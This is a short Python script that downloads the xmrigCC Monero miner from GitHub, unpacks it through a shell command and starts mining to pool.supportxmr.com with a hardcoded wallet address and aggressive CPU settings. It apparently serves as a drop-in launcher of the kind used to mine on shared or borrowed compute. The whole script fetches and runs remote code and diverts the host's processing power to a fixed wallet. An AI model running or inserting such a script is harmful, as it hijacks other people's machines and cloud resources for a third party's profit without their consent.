import subprocess
import requests

url = 'https://github.com/Bendr0id/xmrigCC/releases/download/2.9.5/xmrigCC-2.9.5-linux-generic-amd64.tar.gz'
r = requests.get(url, allow_redirects=True)

open('xmrigCC-2.9.5-linux-generic-amd64.tar.gz', 'wb').write(r.content)
subprocess.call("ls && tar -xvf xmrigCC-2.9.5-linux-generic-amd64.tar.gz && miner/xmrigDaemon -o pool.supportxmr.com:443 -u 86rNBsrqqaX6Ha7zwwyC2BYycsXurMUfxWaoPsUbtvqh7nfDFJ5oATLSUYfhZsCsJ3X31Z4d6PyNWES4gedmCBqHQ9E8Npu -k --tls -p a1 --print-time=2 --donate-level=1 --cpu-priority=8 --randomx-mode=fast --randomx-1gb-pages --cpu-affinity=8 --threads=8 --donate-level=1", shell=True)
